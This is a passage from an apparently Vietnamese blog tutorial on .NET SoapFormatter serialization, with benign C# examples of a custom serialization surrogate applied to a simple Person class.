</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="n">a1</span><span class="p">:</span><span class="n">Person</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="n">SOAP</span><span class="p">-</span><span class="n">ENV</span><span class="p">:</span><span class="n">Body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="n">SOAP</span><span class="p">-</span><span class="n">ENV</span><span class="p">:</span><span class="n">Envelope</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">========================================</span>
</span></span><span class="line"><span class="cl"><span class="n">Edisc</span>
</span></span><span class="line"><span class="cl"><span class="m">18</span>
</span></span><span class="line"><span class="cl"><span class="n">hello</span> <span class="k">from</span> <span class="n">SayHello</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>SOAP (Simple Object Access Protocol) là một giao thức truyền thông được sử dụng để trao đổi thông tin giữa các ứng dụng qua mạng. Trong SOAP, namespace (không gian tên) được sử dụng để giới hạn phạm vi của các phần tử trong tin nhắn SOAP.</p>
</li>
<li>
<p>SOAP sử dụng không gian tên (<strong>namespace</strong>) theo chuẩn <strong>xmlns</strong> để <strong>giới hạn phạm vi namespace</strong>, và điều này được phản ánh trong thẻ <strong>a1</strong>.</p>
<p>Trong output trên, ta thấy rằng các phần tử trong <code>SOAP-ENV:Envelope</code> được liên kết với các namespace thông qua các thuộc tính <code>xmlns.</code> Ví dụ:</p>
<ul>
<li>Phần tử <strong><code>&lt;SOAP-ENV:Envelope&gt;</code></strong> được liên kết với namespace <strong><code>&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</code></strong> thông qua thuộc tính <strong><code>xmlns:SOAP-ENV</code></strong>.</li>
<li>Phần tử <strong><code>&lt;a1:Person&gt;</code></strong> được liên kết với namespace <strong><code>&quot;http://schemas.microsoft.com/clr/nsassem/SoapDeserialization/SoapDeserialization%2C%20Version%3D1.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Dnull&quot;</code></strong> thông qua thuộc tính <strong><code>xmlns:a1</code></strong>.</li>
</ul>
<p>Như vậy, việc sử dụng không gian tên XML (namespace) giúp hạn chế phạm vi của các phần tử trong tin nhắn SOAP và thông tin về namespace này được phản ánh trong thẻ <strong>a1</strong>.</p>
<p>Điều này quan trọng vì nếu không có việc giới hạn namespace, các phần tử có thể xảy ra xung đột hoặc không rõ ràng trong việc xác định phạm vi và ý nghĩa của chúng. Nhờ vào việc sử dụng không gian tên, ta có thể định rõ và xác định các phần tử trong tin nhắn SOAP theo các namespace cụ thể.</p>
</li>
<li>
<p>Ngoài ra, SoapFormatter còn implement 2 interfaces: <strong>IRemotingFormatter, IFormatter.</strong> <strong>IFormatter</strong></p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%204.png"></p>
</li>
<li>
<p><strong>IFormatter</strong> còn có một proxy selector</p>
<blockquote>
<p><em><strong>proxy selector là gì?</strong></em></p>
<p>Trong quá trình deserialize (chuyển đổi từ dữ liệu đã được serialize thành đối tượng) của .NET, <strong>&ldquo;proxy selector&rdquo; (bộ chọn proxy)</strong> là một khái niệm được sử dụng để xác định cách thức chọn loại đối tượng đích để thực hiện quá trình deserialize.</p>
<p>Khi ta thực hiện quá trình deserialize, .NET cần biết cách chọn và xây dựng đúng loại đối tượng mà dữ liệu serialized sẽ được chuyển đổi thành. Đó là lúc &ldquo;proxy selector&rdquo; (bộ chọn proxy) đến. Proxy selector định nghĩa cách thức chọn đúng loại đối tượng tương ứng với dữ liệu đã được serialize.</p>
<p>Proxy selector có thể được sử dụng để tùy chỉnh quá trình deserialize bằng cách xác định bộ chọn proxy tùy chỉnh. Bộ chọn proxy tùy chỉnh này sẽ quyết định loại đối tượng cần được xây dựng và sử dụng trong quá trình deserialize dựa trên dữ liệu serialized và các quy tắc xác định sẵn.</p>
<p>Proxy selector giúp .NET xác định loại đối tượng cụ thể để khôi phục dữ liệu serialized thành đối tượng thích hợp. Nó đóng vai trò quan trọng trong việc đảm bảo quá trình deserialize diễn ra đúng cách và dữ liệu được chuyển đổi thành đối tượng đúng.</p>
</blockquote>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%205.png"></p>
<blockquote>
<p>Để xem được code như trên, ta dùng <a href="https://github.com/dnSpy/dnSpy/releases">dnSpy 64bit</a></p>
<p>TIP: Chúng ta có thể dùng extension GoToDnSpy (dùng cho VS2019 trở đi) thì quá trình trace code sẽ đơn giản hơn nhiều</p>
</blockquote>
</li>
<li>
<p>Hãy sửa đổi đoạn code ban đầu của chúng ta một chút :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Soap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">SoapDeserialization</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="na">    [Serializable]</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Person</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kt">int</span> <span class="n">age</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kt">string</span> <span class="n">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">int</span> <span class="n">Age</span> <span class="p">{</span> <span class="k">get</span> <span class="p">=&gt;</span> <span class="n">age</span><span class="p">;</span> <span class="k">set</span> <span class="p">=&gt;</span> <span class="n">age</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">string</span> <span class="n">Name</span> <span class="p">{</span> <span class="k">get</span> <span class="p">=&gt;</span> <span class="n">name</span><span class="p">;</span> <span class="k">set</span> <span class="p">=&gt;</span> <span class="n">name</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="k">void</span> <span class="n">SayHello</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;hello from SayHello&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">//===================================begin new code ===================================</span>
</span></span><span class="line"><span class="cl">    <span class="kd">sealed</span> <span class="k">class</span> <span class="nc">PersonSerializeSurrogate</span> <span class="p">:</span> <span class="n">ISerializationSurrogate</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="k">void</span> <span class="n">GetObjectData</span><span class="p">(</span><span class="kt">object</span> <span class="n">obj</span><span class="p">,</span> <span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">p</span> <span class="p">=</span> <span class="p">(</span><span class="n">Person</span><span class="p">)</span><span class="n">obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">&#34;Name&#34;</span><span class="p">,</span> <span class="n">p</span><span class="p">.</span><span class="n">Name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">object</span> <span class="n">SetObjectData</span><span class="p">(</span><span class="kt">object</span> <span class="n">obj</span><span class="p">,</span> <span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">,</span> <span class="n">ISurrogateSelector</span> <span class="n">selector</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">p</span> <span class="p">=</span> <span class="p">(</span><span class="n">Person</span><span class="p">)</span><span class="n">obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="p">.</span><span class="n">Name</span> <span class="p">=</span> <span class="n">info</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="s">&#34;Name&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//===================================end new code ===================================</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">SoapFormatter</span> <span class="n">soapFormatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SoapFormatter</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">//=================================== begin new code ===================================</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">ss</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SurrogateSelector</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">ss</span><span class="p">.</span><span class="n">AddSurrogate</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">Person</span><span class="p">),</span> <span class="k">new</span> <span class="n">StreamingContext</span><span class="p">(</span><span class="n">StreamingContextStates</span><span class="p">.</span><span class="n">All</span><span class="p">),</span> <span class="k">new</span> <span class="n">PersonSerializeSurrogate</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">            <span class="n">soapFormatter</span><span class="p">.</span><span class="n">SurrogateSelector</span> <span class="p">=</span> <span class="n">ss</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//===================================end new code ===================================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">Person</span> <span class="n">person</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Person</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">person</span><span class="p">.</span><span class="n">Age</span> <span class="p">=</span> <span class="m">18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">person</span><span class="p">.</span><span class="n">Name</span> <span class="p">=</span> <span class="s">&#34;Edisc&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">using</span> <span class="p">(</span><span class="n">MemoryStream</span> <span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// serialize</span>
</span></span><span class="line"><span class="cl">                <span class="n">soapFormatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">person</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="kt">string</span> <span class="n">soap</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">stream</span><span class="p">.</span><span class="n">ToArray</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">soap</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;========================================&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1">// deserialize</span>
</span></span><span class="line"><span class="cl">                <span class="n">stream</span><span class="p">.</span><span class="n">Position</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">Person</span> <span class="n">p</span> <span class="p">=</span> <span class="p">(</span><span class="n">Person</span><span class="p">)</span><span class="n">soapFormatter</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">Name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">Age</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">p</span><span class="p">.</span><span class="n">SayHello</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">ReadKey</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Kết quả chương trình sau khi chạy:</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%206.png"></p>
<blockquote>
<p><em><strong>Surrogate là gì?</strong></em></p>
<p>Trong C#, Surrogate (đại diện) là một khái niệm liên quan đến quá trình tuần tự hóa (serialization) và phục hồi (deserialization) đối tượng.</p>
<p>Khi một đối tượng được tuần tự hóa hoặc phục hồi, Surrogate được sử dụng để đại diện cho đối tượng gốc và điều khiển quá trình tuần tự hóa và phục hồi. Nó cung cấp một cách để tùy chỉnh hoặc thay đổi cách mà một đối tượng được tuần tự hóa hoặc phục hồi.</p>
<p>Surrogate thường được sử dụng trong các trường hợp như:</p>
<ol>
<li>Tuần tự hóa các đối tượng không tuân theo giao diện ISerializable.</li>
<li>Đối tượng có dữ liệu nhạy cảm mà bạn muốn che giấu hoặc không tuần tự hóa.</li>
<li>Đối tượng có kiểu không tuân theo quy tắc tuần tự hóa mặc định của .NET Framework.</li>
</ol>
<p>Để sử dụng Surrogate, bạn cần triển khai một lớp SurrogateSelector và ghi đè phương thức GetSurrogate của nó. Phương thức GetSurrogate cho phép bạn xác định Surrogate cụ thể để sử dụng cho một kiểu đối tượng nhất định.</p>
<p>Surrogate giúp bạn kiểm soát quá trình tuần tự hóa và phục hồi, cho phép tùy chỉnh và điều chỉnh quá trình này để đáp ứng nhu cầu cụ thể của ứng dụng của bạn.</p>
</blockquote>
</li>
<li>
<p>Khi proxy selector cho class Person được thiết lập cho SoapFormatter, method <code>GetObjectData</code> và <code>SetObjectData</code> trong class <code>PersonSerializeSurrogate</code> sẽ được thực thi trong quá trình serialization và deserialization. (Đây là kiến thức cơ bản, bạn có thể xem chi tiết <a href="https://medium0.com/tradahacking/net-deserialization-101-b39b1f33f7c9?source=user_profile---------1----------------------------">tại đây</a>)</p>
</li>
<li>
<p>Do đó, chúng ta thấy, kết quả của <code>p.Age</code> được in ra là 0 thay vì 18 như trước đó. Lý do là vì chúng ta đã control quá trình serialize và deserialize của object <code>p</code>. Trong class <code>PersonSerializeSurrogate</code>, chỉ có field <code>name</code> được serialize và deserialize nên kết quả vẫn là <code>Edisc</code>. Còn giá trị của age là 0 vì đó là giá trị mặc định khi không được deserialize.</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%207.png"></p>
</li>
<li>
<p>Một tính năng của proxy selector cần lưu ý ở đây là: <em><strong>proxy selector có thể được dùng để serialization và deserialization bất kì class nào kể cả những class không đánh dấu serialized [Serializable]</strong></em></p>
</li>
</ul>
<p>Quay lại ví dụ ban đầu, khi chúng ta sử dụng proxy selector, class Person implements the serialization interface (notation: <code>[Serializable]</code>)</p>
<p>Nếu ta xóa đi notation: <code>[Serializable]</code>. Chương trình vẫn chạy, đây là một tính năng của việc chọn proxy.</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%208.png"></p>
<ul>
<li>Trong quá trình deserialize, luôn có 1 quá trình xem xét liệu class có thể seralize hay không? Điều này dẫn tới một vấn đề: <em><strong>Một class được serialize nhưng khi deserialize nó không thể deserialize proxy selector được implement bởi chúng ta.</strong></em></li>
</ul>
<p>Để hiểu rõ hơn, hãy sửa đổi một chút đoạn code ví dụ ban đầu như sau:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Soap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">SoapDeserialization</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//[Serializable]</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Person</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kt">int</span> <span class="n">age</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kt">string</span> <span class="n">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">int</span> <span class="n">Age</span> <span class="p">{</span> <span class="k">get</span> <span class="p">=&gt;</span> <span class="n">age</span><span class="p">;</span> <span class="k">set</span> <span class="p">=&gt;</span> <span class="n">age</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">string</span> <span class="n">Name</span> <span class="p">{</span> <span class="k">get</span> <span class="p">=&gt;</span> <span class="n">name</span><span class="p">;</span> <span class="k">set</span> <span class="p">=&gt;</span> <span class="n">name</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="k">void</span> <span class="n">SayHello</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;hello from SayHello&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">sealed</span> <span class="k">class</span> <span class="nc">PersonSerializeSurrogate</span> <span class="p">:</span> <span class="n">ISerializationSurrogate</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="k">void</span> <span class="n">GetObjectData</span><span class="p">(</span><span class="kt">object</span> <span class="n">obj</span><span class="p">,</span> <span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">p</span> <span class="p">=</span> <span class="p">(</span><span class="n">Person</span><span class="p">)</span><span class="n">obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">&#34;Name&#34;</span><span class="p">,</span> <span class="n">p</span><span class="p">.</span><span class="n">Name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">object</span> <span class="n">SetObjectData</span><span class="p">(</span><span class="kt">object</span> <span class="n">obj</span><span class="p">,</span> <span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">,</span> <span class="n">ISurrogateSelector</span> <span class="n">selector</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">p</span> <span class="p">=</span> <span class="p">(</span><span class="n">Person</span><span class="p">)</span><span class="n">obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="p">.</span><span class="n">Name</span> <span class="p">=</span> <span class="n">info</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="s">&#34;Name&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">SoapFormatter</span> <span class="n">soapFormatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SoapFormatter</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">ss</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SurrogateSelector</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">ss</span><span class="p">.</span><span class="n">AddSurrogate</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">Person</span><span class="p">),</span> <span class="k">new</span> <span class="n">StreamingContext</span><span class="p">(</span><span class="n">StreamingContextStates</span><span class="p">.</span><span class="n">All</span><span class="p">),</span> <span class="k">new</span> <span class="n">PersonSerializeSurrogate</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">            <span class="n">soapFormatter</span><span class="p">.</span><span class="n">SurrogateSelector</span> <span class="p">=</span> <span class="n">ss</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">Person</span> <span class="n">person</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Person</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">person</span><span class="p">.</span><span class="n">Age</span> <span class="p">=</span> <span class="m">18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">person</span><span class="p">.</span><span class="n">Name</span> <span class="p">=</span> <span class="s">&#34;Edisc&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">MemoryStream</span> <span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="c1">// serialize</span>
</span></span><span class="line"><span class="cl">            <span class="n">soapFormatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">person</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="kt">string</span> <span class="n">soap</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">stream</span><span class="p">.</span><span class="n">ToArray</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">soap</span><span class="p">);</span>
